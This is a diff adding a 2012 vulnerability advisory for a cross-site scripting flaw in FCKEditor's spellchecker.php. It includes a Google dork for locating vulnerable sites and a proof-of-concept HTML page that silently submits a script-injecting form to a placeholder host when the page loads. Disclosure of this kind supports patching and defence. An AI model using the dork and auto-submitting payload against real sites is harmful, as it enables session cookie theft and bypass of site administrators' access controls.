@@ -1,0 +1,33 @@
+#######################################################
+#           FCKEditor XSS post vulnerability           #
+#######################################################
+# Product: FCKEditor for joomla/drupal/wordpress
+# Vendor site: http://ckeditor.com/
+# Affected versions:  FCKEditor <= 2.6.7
+# Product description: WYSIWYG Text and HTML Editor for the Web
+# Author: Emilio Pinna - ncl 01 _at_ email _dot_ it
+# Blog site: http://disse.cting.org
+# Date: 13/06/2012
+ 
+# Vulnerable page: spellchecker.php
+# Google dork: inurl:fck_spellerpages/spellerpages/server-scripts/
+ 
+File "spellchecker.php" suffer from XSS vulnerabilities in line 27.
+ 
+Attackers can exploit these weaknesses to execute arbitrary HTML and script code
+in a user's browser session that visit resulting in a cookie stealing and bypass of admin
+access controls. Exploit is CRSF-like due to POST vulnerable parameter.
+ 
+#--------- File: fsck_editor.html -----------#
+<html>
+<body>
+<iframe style="width: 1px; height: 1px; visibility: hidden" name="hidden"></iframe>
+  <form method="post" name="sender" 
+   action="http://vuln.com//fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php" target="hidden">
+   <input type="hidden" name="textinputs[]" value='");alert("THIS SITE IS XSS VULNERABLE!");</script><!--' />
+  </form>
+</body>
+<script>document.sender.submit(); </script>
+</html>
+#-----------------------------------------------------#
+ 
